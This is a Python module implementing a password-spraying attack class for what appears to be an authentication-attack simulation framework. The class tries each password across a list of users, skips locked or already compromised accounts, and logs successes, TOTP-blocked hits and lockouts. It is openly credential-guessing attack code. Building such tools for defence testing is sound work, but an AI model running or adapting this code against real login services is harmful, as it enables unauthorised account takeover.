# ============================================================
#                        Imports
# ============================================================
from attacks.base_attack import BaseAttack
from core.LoginResult import LoginResult
from tqdm import tqdm


# ============================================================
#                Password Spray Attack Class
# ============================================================
class PasswordSprayAttack(BaseAttack):
    """
    Implements a password spraying attack.
    Tries a small set of passwords across multiple users.
    Inherits common attack logic from BaseAttack.
    """

    # ========================================================
    #                       Constructor
    # ========================================================
    def __init__(
        self,
        client,
        timer,
        success_code,
        lockout_code,
        captcha_code,
        totp_code,
        max_time,
        max_attempts,
        users,
        passwords
    ):
        super().__init__(
            client,
            timer,
            success_code,
            lockout_code,
            captcha_code,
            totp_code,
            max_time,
            max_attempts
        )
        self.users = users
        self.passwords = passwords


    # ========================================================
    #                   Attack Execution Logic
    # ========================================================
    def run(self):
        """
        Executes the password spraying attack by iterating
        over passwords first, then over all target users.
        """
        pbar = tqdm(total=len(self.passwords), desc="password dictionary", dynamic_ncols=True)

        for password in self.passwords:
            pbar.update(1)
            for user in self.users:

                # ------------------------------------------------
                # Check if attack should stop (time / attempts)
                # ------------------------------------------------
                expired, reason = self.attack_expired()
                if expired:
                    print(f"[!] Attack stopped: {reason.value}")
                    return

                # ------------------------------------------------
                # Skip users that are already locked or hacked
                # ------------------------------------------------
                if user.locked or user.hacked:
                    continue

                # ------------------------------------------------
                # Attempt login
                # ------------------------------------------------
                result = self.attempt_login(user, password)
                self.attempts += 1

                # ------------------------------------------------
                # Handle login result
                # ------------------------------------------------
                if result == LoginResult.SUCCESS:
                    tqdm.write(f"[!] Attack succeeded on {user.username}")

                if result == LoginResult.PARTIAL_SUCCESS:
                    tqdm.write(f"[!] Password correct for {user.username}, TOTP required")

                if result == LoginResult.LOCKED:
                    tqdm.write(f"[!] Attack stopped on {user.username}: account locked")
